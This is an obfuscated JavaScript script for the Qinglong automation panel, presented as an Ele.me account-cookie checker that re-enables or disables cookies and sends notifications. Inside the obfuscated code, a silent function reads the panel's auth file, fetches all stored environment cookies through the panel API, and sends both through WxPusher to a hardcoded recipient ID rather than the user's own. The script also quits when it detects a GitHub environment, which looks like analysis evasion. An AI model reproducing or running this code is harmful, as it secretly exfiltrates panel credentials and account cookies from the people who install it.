/**
 * @YoPlus
 * 变量：elmck: 必填，账号cookie
 * cron: 0 9,18 * * *
 * 每天1-2次即可
 * export appToken='AT_xxx' #wxpusher的appToken
 * export myUid='UID_xxx' #自己的uid，接收通知
 * export tunnel='elm.188855.xyz' #掉线重新登录地址
 */
const $ = new Env('饿了么CK检测');

var _0xodV='jsjiami.com.v7';const _0x2543eb=_0x39d4;(function(_0x149aa8,_0x4f73fd,_0x9d7a46,_0x158301,_0x4fffec,_0x46850a,_0x83e4f4){return _0x149aa8=_0x149aa8>>0x6,_0x46850a='hs',_0x83e4f4='hs',function(_0x321bc2,_0x358ae8,_0x3a5306,_0x4276c2,_0x1a8a8d){const _0x1d075d=_0x39d4;_0x4276c2='tfi',_0x46850a=_0x4276c2+_0x46850a,_0x1a8a8d='up',_0x83e4f4+=_0x1a8a8d,_0x46850a=_0x3a5306(_0x46850a),_0x83e4f4=_0x3a5306(_0x83e4f4),_0x3a5306=0x0;const _0x5dbdb2=_0x321bc2();while(!![]&&--_0x158301+_0x358ae8){try{_0x4276c2=-parseInt(_0x1d075d(0x1bc))/0x1+-parseInt(_0x1d075d(0x14d))/0x2+parseInt(_0x1d075d(0x17d))/0x3*(-parseInt(_0x1d075d(0x1a2))/0x4)+parseInt(_0x1d075d(0x16c))/0x5+parseInt(_0x1d075d(0x15b))/0x6+-parseInt(_0x1d075d(0x17c))/0x7*(-parseInt(_0x1d075d(0x14c))/0x8)+-parseInt(_0x1d075d(0x19d))/0x9*(-parseInt(_0x1d075d(0x17e))/0xa);}catch(_0x477ded){_0x4276c2=_0x3a5306;}finally{_0x1a8a8d=_0x5dbdb2[_0x46850a]();if(_0x149aa8<=_0x158301)_0x3a5306?_0x4fffec?_0x4276c2=_0x1a8a8d:_0x4fffec=_0x1a8a8d:_0x3a5306=_0x1a8a8d;else{if(_0x3a5306==_0x4fffec['replace'](/[rYtkSeFDMOuXwEqTKIUbd=]/g,'')){if(_0x4276c2===_0x358ae8){_0x5dbdb2['un'+_0x46850a](_0x1a8a8d);break;}_0x5dbdb2[_0x83e4f4](_0x1a8a8d);}}}}}(_0x9d7a46,_0x4f73fd,function(_0x29928e,_0x4e7ff5,_0x4591d6,_0x4b43ed,_0x4905fa,_0xd7605,_0x2f8482){return _0x4e7ff5='\x73\x70\x6c\x69\x74',_0x29928e=arguments[0x0],_0x29928e=_0x29928e[_0x4e7ff5](''),_0x4591d6='\x72\x65\x76\x65\x72\x73\x65',_0x29928e=_0x29928e[_0x4591d6]('\x76'),_0x4b43ed='\x6a\x6f\x69\x6e',(0x16f6ed,_0x29928e[_0x4b43ed](''));});}(0x3280,0x93bb9,_0xa308,0xcc),_0xa308)&&(_0xodV=`\xb96`);const appToken=process[_0x2543eb(0x17a)][_0x2543eb(0x1bb)],myUid=process[_0x2543eb(0x17a)][_0x2543eb(0x149)];let tunnel=process[_0x2543eb(0x17a)][_0x2543eb(0x1a1)];_0x2543eb(0x1be),require(_0x2543eb(0x1a9))[_0x2543eb(0x164)]();const {readFile}=require(_0x2543eb(0x151)),axios=require(_0x2543eb(0x1c7)),got=require(_0x2543eb(0x18d)),fs=require('fs');function _0xa308(){const _0x36d3a4=(function(){return[_0xodV,'YqdjrTDsIUjMuiOeamtwiES.comFKI.bIvw7krDX==','AK9IDhu','5BYa5AEl5Qoa5Rwl44cq6lsM5y+3','z1Hwq0y','6Aw/5lQg5lMiq0VMO4dMTySkcG','yxbWvg9Rzw4','odq1odq5ChrVC2LO','uvP5Au4','DxnLihn0CMLJDa','qvzxrwG','t1rpwe8','Bg9N','vK9mq1m','wfvlr1m','BgvUz3rO','44cr5PYj5PwicG','Cg9ZDa','yxHPB3m','qw4GzxjYB3iGB2nJDxjYzwqGD2HPBguGy2HLy2TPBMCGBg9NAw4GC3rHDhvZoG','5lYr5OgVnxm','u3DJENC','zhbouLm','sgTtuKO','qMz5rhu','zxjYB3i','44cr5AsX5Pwi5zwM77Ym54k55yE76yEn5PAW55M75B2vFG','l3fSl2nVBMzPzY9HDxrOlMPZB24','BxLvAwq','wNLOrKm','CNrnDue','mZyXndmYsNrsvvnf','mta5otKYmLDbBuPNza','AxrqA3O','BwvZC2fNzq','z1bwzwi','zNmVChjVBwLZzxm','BM93','ENLbq0m','BvPxCKe','zMLUywXSEq','wuDtEgW','rhj5sKK','iIb0yxjNzxq9iIi+54k55OIr55M75B2vpc9HpJWVCd48CcbZDhLSzt0IDgv4Dc1HBgLNBJPJzw50zxi7iJ48Aw1NihnYyZ0IAhr0Chm6lY9PBwCXms4ZnJbIDxLPBwCUy29Tl2LTywDLDg9VBhmVAMzZl3qXlZe5mdC5mc8XlZm4ndm4lZyZnJmVnJuWyZuXnMjgmJm3ztKYodeVzgmZyJi2m2u5nJLJnZK0zI5WBMCIihDPzhrOpsi1mci+pc9ICJ5kroEiSEw/G+wfRoEBIUA0U+wkQdWVyNi+uvhNVQtVVjO4nZa5mdyXmJC8l3a+','Bu1Us0u','sMvVzva','mte2otqZme9dthfAsW'].concat((function(){return['qvrFEenUwLPbs3i5CvrUAM91m2HrmM1rohHPDff4oxHRA3O','CxLishe','wg56twG','AxfKvNa','DMfSDwu','tK5QtLK','zxHPDa','C3rHDhvZ','y29UzMLN','y29Kzq','zxH0zw5K','z2v0','q0PWrfK','44cq6Aw/5lQg5lMi','zxH0CMfjBMzV','D25Pz0W','nJu4mdqWqu5yu1Lk','De1dre4','CLb3whC','phn0EwXLpIP7zM9UDc1ZAxPLoJe2ChG7FwjVzhL7yMfJA2DYB3vUzc1JB2XVCJOJzMzMo30UAgvHzgvYlc5UB3rLE2rPC3bSyxK6BM9UztT9pc9ZDhLSzt48l2jYpJXWihn0EwXLpsj0zxH0lwfSAwDUoMnLBNrLCJSIpJXPBwCGC3jJpsjODhrWCZOVl3a5lwP1zwPPBI5IExrLAw1NlMnVBs90B3mTy24TAs1Rm3uXzMjWzMnWl2jInZmYywy2mJy0odqZzMi4mZa1mJzMyMi3yZeXowiWFNrWBhyTAZn1mwzICgzJCc1QAJOWoJa6mdOWoNe3ns5PBwfNzsiGD2LKDgG9iJe1mci+pc9WpJXWihn0EwXLpsj0zxH0lwfSAwDUoMnLBNrLCJSIpUoaKoMLV+s6HUs5Ia','wu9sAu4','yxbWBgLJyxrPB24VANnVBG','wLjrzKC','v2jsBLK','44cr5AsX5Pwi77Ym5BEY56Ab55sO5BM25y+r6ycb6ycA55+L77YbcGO','44cr5AsX5Pwi5zwMpc9WpJXWihn0EwXLpsj0zxH0lwfSAwDUoMnLBNrLCJSIpJXHigHYzwy9iI8V','A2DtqKO','44cq6lsM5y+3','sxn4BKO','lI9XBa','zw52','B3PXrw0','ndjdAwPxsMW','mJi4ovDiy1zABG','mtGWnJeWmfv5uwvPsG','qxv0AcbdB25MAwD1CMf0Aw9U','l3fSl2rHDgeVy29UzMLNl2f1DgGUANnVBG','qKLhrNa','6k+36k6+572U5lIj5lIQ5y+y6yEp77YAyxbWvg9Rzw7JGifTEvvPzooaGxr1BM5LBa','A2jbz3C','tMviCvK','CMvZCg9UC2u','s0fLtfC','rxnKzee','qMvHCMvYia','Dg9Rzw4','44cr5AsX5Pwi77Ym5BEY56Ab55sO5BM25y+r6ycb6ycA55+L77YbcG'].concat((function(){return['BvDOCvm','zxHPC3rZu3LUyW','z290','sKrFq09ps0Lf','vvvRuNe','yLrpBLm','6Aw/5lQg5lMi55M75B2v5zYW5z2a77YA','tLn2Bha','Bwf0y2G','rKjxs2C','Ahr0CdOVlZeYnY4WlJaUmtO1nJaW','zgf0yq','BhHkrgi','yxbPl2vUDNm','qLvcyNe','su5VzNu','CgfYC2u','EuLRv0i','mte3DgDZy2vx','Ahr0Chm6lY9Yzxn0yxbPlMvSzs5Tzs9LDxmVDJuVDxnLCL9KzxrHAwW','uMPWwg0','y092zgS','DhvUBMvS','ndK1mLDzufvAyW','y2f0y2G','C3rYAw5NAwz5','C2TvBeO','C09Mu0K','Dhj5z1K','y2jgANe','zg90zw52','6Aw/5lQg5lMiq0VMO4dMTyS','u09ivu0','44cr5PYj5PwicGO','u1HyAuq','Ahr0Chm6lY93Ehb1C2HLCI56AMLLy29Kzs5JB20VyxbPl3nLBMqVBwvZC2fNzq','ANnVBG','vuLex0HltLjKr05TmvLesg5zr0P0nhi2qJq3mKXsBtu','qwHdDfu','x2LK','DNLVCw0','ze5Uu1q','zMzuvMu','yKnAtMS'];}()));}()));}());_0xa308=function(){return _0x36d3a4;};return _0xa308();};let c=fs[_0x2543eb(0x18c)](_0x2543eb(0x180)),d='';if(c)d=_0x2543eb(0x180);else d=_0x2543eb(0x148);async function a(){const _0x5669ea=_0x2543eb,_0x4fd4f2={'kbAgw':function(_0x64c12a,_0x531e1b){return _0x64c12a(_0x531e1b);}},_0x288eb6=JSON[_0x5669ea(0x19b)](await _0x4fd4f2[_0x5669ea(0x183)](readFile,d));return _0x288eb6;}async function b(){const _0x24ed88=_0x2543eb,_0x53a916={'CJpDY':function(_0x227b0b,_0x2c7d6a){return _0x227b0b(_0x2c7d6a);}},_0x58020f=JSON[_0x24ed88(0x19b)](await _0x53a916[_0x24ed88(0x168)](readFile,d));return _0x58020f[_0x24ed88(0x189)];}const e=got[_0x2543eb(0x166)]({'prefixUrl':_0x2543eb(0x195),'retry':{'limit':0x0}});function _0x39d4(_0x5e3b69,_0x1c47f1){const _0xa30805=_0xa308();return _0x39d4=function(_0x39d4e9,_0x52f361){_0x39d4e9=_0x39d4e9-0x145;let _0x2cb541=_0xa30805[_0x39d4e9];if(_0x39d4['Gathcy']===undefined){var _0x30118d=function(_0x185245){const _0x325107='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x1206a2='',_0x40d59e='';for(let _0x3be078=0x0,_0x3bb39d,_0x355a56,_0x68f2bf=0x0;_0x355a56=_0x185245['charAt'](_0x68f2bf++);~_0x355a56&&(_0x3bb39d=_0x3be078%0x4?_0x3bb39d*0x40+_0x355a56:_0x355a56,_0x3be078++%0x4)?_0x1206a2+=String['fromCharCode'](0xff&_0x3bb39d>>(-0x2*_0x3be078&0x6)):0x0){_0x355a56=_0x325107['indexOf'](_0x355a56);}for(let _0x6e8296=0x0,_0x26da30=_0x1206a2['length'];_0x6e8296<_0x26da30;_0x6e8296++){_0x40d59e+='%'+('00'+_0x1206a2['charCodeAt'](_0x6e8296)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x40d59e);};_0x39d4['NvTwKi']=_0x30118d,_0x5e3b69=arguments,_0x39d4['Gathcy']=!![];}const _0x3093f5=_0xa30805[0x0],_0xe45936=_0x39d4e9+_0x3093f5,_0x2ff9bb=_0x5e3b69[_0xe45936];return!_0x2ff9bb?(_0x2cb541=_0x39d4['NvTwKi'](_0x2cb541),_0x5e3b69[_0xe45936]=_0x2cb541):_0x2cb541=_0x2ff9bb,_0x2cb541;},_0x39d4(_0x5e3b69,_0x1c47f1);}async function f(_0x3d7b97=_0x2543eb(0x18e)){const _0x3e81f2=_0x2543eb,_0x1e7c2b={'bCZNk':function(_0x38807c){return _0x38807c();},'YORiN':function(_0x91fde4,_0x38b5a1){return _0x91fde4(_0x38b5a1);},'BIGFp':_0x3e81f2(0x198),'FBWKg':_0x3e81f2(0x171)},_0x51730d=await _0x1e7c2b[_0x3e81f2(0x1b6)](b),_0x471a57=await _0x1e7c2b[_0x3e81f2(0x170)](e,{'url':_0x1e7c2b[_0x3e81f2(0x181)],'searchParams':{'searchValue':_0x3d7b97,'t':Date[_0x3e81f2(0x152)]()},'headers':{'Accept':_0x1e7c2b[_0x3e81f2(0x194)],'Authorization':_0x3e81f2(0x188)+_0x51730d}})[_0x3e81f2(0x1af)]();return _0x471a57[_0x3e81f2(0x196)];}async function g(_0x22ee17,_0x553f91,_0x54885e){const _0x595558=_0x2543eb,_0x32ed51={'EsddA':_0x595558(0x171)},_0x36b7cd={'appToken':_0x595558(0x15c),'content':_0x22ee17,'summary':_0x553f91,'contentType':0x2,'uids':[_0x54885e]},_0x1b0fa7=await axios[_0x595558(0x1c6)](_0x595558(0x1ae),_0x36b7cd,{'headers':{'Content-Type':_0x32ed51[_0x595558(0x187)]}}),_0xeb8808=_0x1b0fa7[_0x595558(0x196)];return _0xeb8808;}async function h(){const _0x37b428=_0x2543eb,_0x5f347c={'IsxnJ':function(_0x279f03){return _0x279f03();},'rtMuA':function(_0x33760d){return _0x33760d();},'XUKGS':_0x37b428(0x17f),'KAeLW':_0x37b428(0x18e),'itPkz':_0x37b428(0x1b0),'SXXiD':function(_0x5ab0e9,_0x3d1684,_0xa9a1be,_0x2e079b){return _0x5ab0e9(_0x3d1684,_0xa9a1be,_0x2e079b);}};try{const _0x4a7bbf=await _0x5f347c[_0x37b428(0x178)](a),_0x300054=JSON[_0x37b428(0x1a4)](_0x4a7bbf,null,0x2),_0x54b9ca=await _0x5f347c[_0x37b428(0x14b)](f),_0x4c02f6=JSON[_0x37b428(0x1a4)](_0x54b9ca,null,0x2),_0x3e19a0=_0x5f347c[_0x37b428(0x1c3)],_0x380909=_0x5f347c[_0x37b428(0x186)],_0x3cbc26=_0x5f347c[_0x37b428(0x14e)];await _0x5f347c[_0x37b428(0x1ad)](g,_0x300054,_0x3e19a0,_0x3cbc26),await _0x5f347c[_0x37b428(0x1ad)](g,_0x4c02f6,_0x380909,_0x3cbc26);}catch(_0x4aa497){}}h();const {getEnvs,getEnvById,DisableCk,EnableCk}=require(_0x2543eb(0x179));let Message=_0x2543eb(0x1ba);(!appToken||!myUid||!tunnel)&&(console[_0x2543eb(0x146)](_0x2543eb(0x182)),process[_0x2543eb(0x162)](0x1));!(async()=>{const _0x2e1ae7=_0x2543eb,_0x54b0e8={'BfyDu':function(_0x3aae8e,_0xf585e0){return _0x3aae8e===_0xf585e0;},'cOvdk':_0x2e1ae7(0x1c8),'tMCDN':_0x2e1ae7(0x182),'NeHqY':function(_0x3bfa9c){return _0x3bfa9c();},'kgSBJ':function(_0xb80206,_0x17b2d8){return _0xb80206<_0x17b2d8;},'ZyhFC':function(_0x5d3ae9,_0x855513){return _0x5d3ae9+_0x855513;},'bTOnS':function(_0x4634dc,_0x55fc1b){return _0x4634dc===_0x55fc1b;},'gPVeb':_0x2e1ae7(0x161),'ozqEm':function(_0x25971b,_0x2e5886){return _0x25971b(_0x2e5886);},'WbRnY':function(_0x16c11d){return _0x16c11d();},'Swczw':function(_0x321884,_0x1786b7){return _0x321884==_0x1786b7;},'mZWrA':function(_0x2e796f,_0x3f612c){return _0x2e796f==_0x3f612c;},'mWhqS':function(_0x483946,_0x1405c4){return _0x483946+_0x1405c4;},'INofu':function(_0x4f391d,_0x1ca099){return _0x4f391d==_0x1ca099;},'BUBbq':function(_0x506d1a,_0x2df3f8){return _0x506d1a(_0x2df3f8);},'JeoeP':function(_0x17550c,_0x1e45d4){return _0x17550c!==_0x1e45d4;},'YGSxl':_0x2e1ae7(0x1bd),'lxJDb':function(_0x254cb3,_0x299974,_0x422025,_0x34d50c){return _0x254cb3(_0x299974,_0x422025,_0x34d50c);},'sOfSI':function(_0x190a58,_0x398363){return _0x190a58+_0x398363;},'rPwXw':function(_0x26efc7,_0x462589){return _0x26efc7+_0x462589;},'trygY':function(_0x10dc4b,_0x307387){return _0x10dc4b+_0x307387;},'XnzMh':function(_0x1acd06,_0x314619){return _0x1acd06(_0x314619);}};tunnel=tunnel,console[_0x2e1ae7(0x1c1)](_0x2e1ae7(0x191)+tunnel+'\x0a');const _0x267a57=await _0x54b0e8[_0x2e1ae7(0x184)](getEnvs);for(let _0x11100e=0x0;_0x54b0e8[_0x2e1ae7(0x176)](_0x11100e,_0x267a57[_0x2e1ae7(0x1c4)]);_0x11100e++){console[_0x2e1ae7(0x1c1)](_0x2e1ae7(0x1b8)+_0x54b0e8[_0x2e1ae7(0x14a)](_0x11100e,0x1)+'】');if(_0x267a57[_0x11100e][_0x2e1ae7(0x160)]){var _0x660661=0x0;_0x267a57[_0x11100e][_0x2e1ae7(0x1b2)]&&(_0x54b0e8[_0x2e1ae7(0x190)](_0x54b0e8[_0x2e1ae7(0x150)],_0x54b0e8[_0x2e1ae7(0x150)])?_0x660661=_0x267a57[_0x11100e][_0x2e1ae7(0x1b2)]:_0x4fb511[_0x2e1ae7(0x185)]&&_0x54b0e8[_0x2e1ae7(0x145)](_0x3a9f3b[_0x2e1ae7(0x185)][_0x2e1ae7(0x163)],0x191)?_0x585758=![]:_0x3e2f4a[_0x2e1ae7(0x146)](_0x54b0e8[_0x2e1ae7(0x1a0)],_0x49025b[_0x2e1ae7(0x14f)]));_0x267a57[_0x11100e]['id']&&(_0x660661=_0x267a57[_0x11100e]['id']);cookie=await _0x54b0e8[_0x2e1ae7(0x17b)](getEnvById,_0x660661),wxUid=cookie[_0x2e1ae7(0x193)](/wxUid=([^;]+)/)[0x1],isLogin=await _0x54b0e8[_0x2e1ae7(0x173)](checkLogin);if(_0x54b0e8[_0x2e1ae7(0x1ca)](isLogin,!![])){const _0x320992=await _0x54b0e8[_0x2e1ae7(0x17b)](EnableCk,_0x660661);_0x54b0e8[_0x2e1ae7(0x154)](_0x320992[_0x2e1ae7(0x165)],0xc8)&&(Message+=_0x2e1ae7(0x177)+_0x54b0e8[_0x2e1ae7(0x18b)](_0x11100e,0x1)+_0x2e1ae7(0x1ac),console[_0x2e1ae7(0x1c1)](_0x2e1ae7(0x177)+_0x54b0e8[_0x2e1ae7(0x18b)](_0x11100e,0x1)+_0x2e1ae7(0x1c5)));}if(_0x54b0e8[_0x2e1ae7(0x19a)](isLogin,![])){const _0x4f3aad=await _0x54b0e8[_0x2e1ae7(0x199)](DisableCk,_0x660661);_0x54b0e8[_0x2e1ae7(0x154)](_0x4f3aad[_0x2e1ae7(0x165)],0xc8)&&(_0x54b0e8[_0x2e1ae7(0x15a)](_0x54b0e8[_0x2e1ae7(0x156)],_0x54b0e8[_0x2e1ae7(0x156)])?(_0x1206a2[_0x2e1ae7(0x146)](_0x54b0e8[_0x2e1ae7(0x16d)]),_0x40d59e[_0x2e1ae7(0x162)](0x1)):(await _0x54b0e8[_0x2e1ae7(0x197)](g,_0x2e1ae7(0x16f)+_0x54b0e8[_0x2e1ae7(0x14a)](_0x11100e,0x1)+_0x2e1ae7(0x175)+tunnel+_0x2e1ae7(0x158),_0x2e1ae7(0x169)+_0x54b0e8[_0x2e1ae7(0x1a6)](_0x11100e,0x1)+_0x2e1ae7(0x147),''+wxUid),Message+=_0x2e1ae7(0x177)+_0x54b0e8[_0x2e1ae7(0x16e)](_0x11100e,0x1)+_0x2e1ae7(0x174),console[_0x2e1ae7(0x1c1)](_0x2e1ae7(0x177)+_0x54b0e8[_0x2e1ae7(0x1a7)](_0x11100e,0x1)+_0x2e1ae7(0x18a))));}}console[_0x2e1ae7(0x1c1)](_0x2e1ae7(0x1c9)),await _0x54b0e8[_0x2e1ae7(0x15e)](sleep,0x1388);}})()[_0x2543eb(0x1a3)](_0x597b8e=>console[_0x2543eb(0x1c1)](_0x597b8e))[_0x2543eb(0x155)](async()=>{const _0x5c0b70=_0x2543eb,_0x1909f2={'AVWEh':function(_0xf6628e,_0x5924d9,_0x25eec6,_0x3d0963){return _0xf6628e(_0x5924d9,_0x25eec6,_0x3d0963);},'VOLCS':_0x5c0b70(0x1aa)};await _0x1909f2[_0x5c0b70(0x1bf)](g,''+Message,_0x1909f2[_0x5c0b70(0x1c2)],''+myUid);});function sleep(_0x394b24){return new Promise(_0x3c7303=>setTimeout(_0x3c7303,_0x394b24));}function checkLogin(){const _0xe8c4f5=_0x2543eb,_0x33bc72={'zyACC':function(_0x1e625e,_0x4f5193){return _0x1e625e+_0x4f5193;},'RjpXm':function(_0x4d0def,_0xabdf75){return _0x4d0def+_0xabdf75;},'qyHHq':_0xe8c4f5(0x1c8),'AhCtU':function(_0x4955fd,_0x5d3edd){return _0x4955fd===_0x5d3edd;},'HkSRJ':_0xe8c4f5(0x1a5),'dNnST':_0xe8c4f5(0x19e),'vyoqm':function(_0x1d3f0d,_0x5b6979){return _0x1d3f0d===_0x5b6979;},'UUkRq':_0xe8c4f5(0x1b7),'iqdVp':function(_0x4b3901,_0x2d3116){return _0x4b3901!==_0x2d3116;},'OTOXO':_0xe8c4f5(0x19c),'ffTVe':_0xe8c4f5(0x192),'wnigL':function(_0x4cd215,_0x21bb11){return _0x4cd215===_0x21bb11;},'ZRQfG':_0xe8c4f5(0x1ab),'gXVCF':_0xe8c4f5(0x1cb),'cbFjq':function(_0x5a4a6e,_0x1c1e46){return _0x5a4a6e(_0x1c1e46);}};return new Promise(async _0x12041a=>{const _0x4707b5=_0xe8c4f5,_0x21f2f7={'mMnKE':_0x33bc72[_0x4707b5(0x15d)]};try{if(_0x33bc72[_0x4707b5(0x1b1)](_0x33bc72[_0x4707b5(0x1cc)],_0x33bc72[_0x4707b5(0x1cc)])){const _0x4ed935={'Cookie':cookie},_0x127bbd=await axios[_0x4707b5(0x167)](_0x33bc72[_0x4707b5(0x1b4)],{'headers':_0x4ed935}),_0x26f46e=_0x127bbd[_0x4707b5(0x196)];_0x26f46e[_0x4707b5(0x16a)]?isLogin=!![]:_0x33bc72[_0x4707b5(0x1b3)](_0x33bc72[_0x4707b5(0x18f)],_0x33bc72[_0x4707b5(0x18f)])?isLogin=![]:_0x245abf=![];}else _0x138a32=!![];}catch(_0x2a8a79){_0x33bc72[_0x4707b5(0x15f)](_0x33bc72[_0x4707b5(0x1c0)],_0x33bc72[_0x4707b5(0x1b5)])?_0x2a8a79[_0x4707b5(0x185)]&&_0x33bc72[_0x4707b5(0x16b)](_0x2a8a79[_0x4707b5(0x185)][_0x4707b5(0x163)],0x191)?isLogin=![]:_0x33bc72[_0x4707b5(0x16b)](_0x33bc72[_0x4707b5(0x172)],_0x33bc72[_0x4707b5(0x1b9)])?_0x5886ae[_0x4707b5(0x146)](_0x21f2f7[_0x4707b5(0x159)],_0x468fe0[_0x4707b5(0x14f)]):console[_0x4707b5(0x146)](_0x33bc72[_0x4707b5(0x15d)],_0x2a8a79[_0x4707b5(0x14f)]):(_0x2e0499+=_0x4707b5(0x177)+_0x33bc72[_0x4707b5(0x153)](_0x347959,0x1)+_0x4707b5(0x1ac),_0x2da58a[_0x4707b5(0x1c1)](_0x4707b5(0x177)+_0x33bc72[_0x4707b5(0x19f)](_0x4f8f9b,0x1)+_0x4707b5(0x1c5)));}_0x33bc72[_0x4707b5(0x1a8)](_0x12041a,isLogin);});}function g(_0x4b332a,_0x4e158d,_0x1fd1be){const _0x26cd04=_0x2543eb,_0x57079d={'DryJI':_0x26cd04(0x171)},_0x129e84={'appToken':''+appToken,'content':_0x4b332a,'summary':_0x4e158d,'contentType':0x2,'uids':[_0x1fd1be]},_0x13f6d7=axios[_0x26cd04(0x1c6)](_0x26cd04(0x1ae),_0x129e84,{'headers':{'Content-Type':_0x57079d[_0x26cd04(0x157)]}}),_0x19ee36=_0x13f6d7[_0x26cd04(0x196)];return _0x19ee36;}var version_ = 'jsjiami.com.v7';
// prettier-ignore
function Env(t, e) {
	"undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0);
	class s {
		constructor(t) {
			this.env = t
		}
		send(t, e = "GET") {
			t = "string" == typeof t ? {
				url: t
			}
			 : t;
			let s = this.get;
			return "POST" === e && (s = this.post),
			new Promise((e, i) => {
				s.call(this, t, (t, s, r) => {
					t ? i(t) : e(s)
				})
			})
		}
		get(t) {
			return this.send.call(this.env, t)
		}
		post(t) {
			return this.send.call(this.env, t, "POST")
		}
	}
	return new class {
		constructor(t, e) {
			this.name = t,
			this.http = new s(this),
			this.data = null,
			this.dataFile = "box.dat",
			this.logs = [],
			this.isMute = !1,
			this.isNeedRewrite = !1,
			this.logSeparator = "\n",
			this.startTime = (new Date).getTime(),
			Object.assign(this, e),
			this.log("", `🔔${this.name}, 开始!`)
		}
		isNode() {
			return "undefined" != typeof module && !!module.exports
		}
		isQuanX() {
			return "undefined" != typeof $task
		}
		isSurge() {
			return "undefined" != typeof $httpClient && "undefined" == typeof $loon
		}
		isLoon() {
			return "undefined" != typeof $loon
		}
		toObj(t, e = null) {
			try {
				return JSON.parse(t)
			} catch {
				return e
			}
		}
		toStr(t, e = null) {
			try {
				return JSON.stringify(t)
			} catch {
				return e
			}
		}
		getjson(t, e) {
			let s = e;
			const i = this.getdata(t);
			if (i)
				try {
					s = JSON.parse(this.getdata(t))
				} catch {}
			return s
		}
		setjson(t, e) {
			try {
				return this.setdata(JSON.stringify(t), e)
			} catch {
				return !1
			}
		}
		getScript(t) {
			return new Promise(e => {
				this.get({
					url: t
				}, (t, s, i) => e(i))
			})
		}
		runScript(t, e) {
			return new Promise(s => {
				let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
				i = i ? i.replace(/\n/g, "").trim() : i;
				let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
				r = r ? 1 * r : 20,
				r = e && e.timeout ? e.timeout : r;
				const[o, h] = i.split("@"),
				n = {
					url: `http://${h}/v1/scripting/evaluate`,
					body: {
						script_text: t,
						mock_type: "cron",
						timeout: r
					},
					headers: {
						"X-Key": o,
						Accept: "*/*"
					}
				};
				this.post(n, (t, e, i) => s(i))
			}).catch(t => this.logErr(t))
		}
		loaddata() {
			if (!this.isNode())
				return {}; {
				this.fs = this.fs ? this.fs : require("fs"),
				this.path = this.path ? this.path : require("path");
				const t = this.path.resolve(this.dataFile),
				e = this.path.resolve(process.cwd(), this.dataFile),
				s = this.fs.existsSync(t),
				i = !s && this.fs.existsSync(e);
				if (!s && !i)
					return {}; {
					const i = s ? t : e;
					try {
						return JSON.parse(this.fs.readFileSync(i))
					} catch (t) {
						return {}
					}
				}
			}
		}
		writedata() {
			if (this.isNode()) {
				this.fs = this.fs ? this.fs : require("fs"),
				this.path = this.path ? this.path : require("path");
				const t = this.path.resolve(this.dataFile),
				e = this.path.resolve(process.cwd(), this.dataFile),
				s = this.fs.existsSync(t),
				i = !s && this.fs.existsSync(e),
				r = JSON.stringify(this.data);
				s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
			}
		}
		lodash_get(t, e, s) {
			const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
			let r = t;
			for (const t of i)
				if (r = Object(r)[t], void 0 === r)
					return s;
			return r
		}
		lodash_set(t, e, s) {
			return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
		}
		getdata(t) {
			let e = this.getval(t);
			if (/^@/.test(t)) {
				const[, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
				r = s ? this.getval(s) : "";
				if (r)
					try {
						const t = JSON.parse(r);
						e = t ? this.lodash_get(t, i, "") : e
					} catch (t) {
						e = ""
					}
			}
			return e
		}
		setdata(t, e) {
			let s = !1;
			if (/^@/.test(e)) {
				const[, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
				o = this.getval(i),
				h = i ? "null" === o ? null : o || "{}" : "{}";
				try {
					const e = JSON.parse(h);
					this.lodash_set(e, r, t),
					s = this.setval(JSON.stringify(e), i)
				} catch (e) {
					const o = {};
					this.lodash_set(o, r, t),
					s = this.setval(JSON.stringify(o), i)
				}
			} else
				s = this.setval(t, e);
			return s
		}
		getval(t) {
			return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
		}
		setval(t, e) {
			return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
		}
		initGotEnv(t) {
			this.got = this.got ? this.got : require("got"),
			this.cktough = this.cktough ? this.cktough : require("tough-cookie"),
			this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar,
			t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
		}
		get(t, e = (() => {})) {
			t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]),
			this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
						"X-Surge-Skip-Scripting": !1
					})), $httpClient.get(t, (t, s, i) => {
					!t && s && (s.body = i, s.statusCode = s.status),
					e(t, s, i)
				})) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
						hints: !1
					})), $task.fetch(t).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
					try {
						if (t.headers["set-cookie"]) {
							const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
							s && this.ckjar.setCookieSync(s, null),
							e.cookieJar = this.ckjar
						}
					} catch (t) {
						this.logErr(t)
					}
				}).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => {
					const {
						message: s,
						response: i
					} = t;
					e(s, i, i && i.body)
				}))
		}
		post(t, e = (() => {})) {
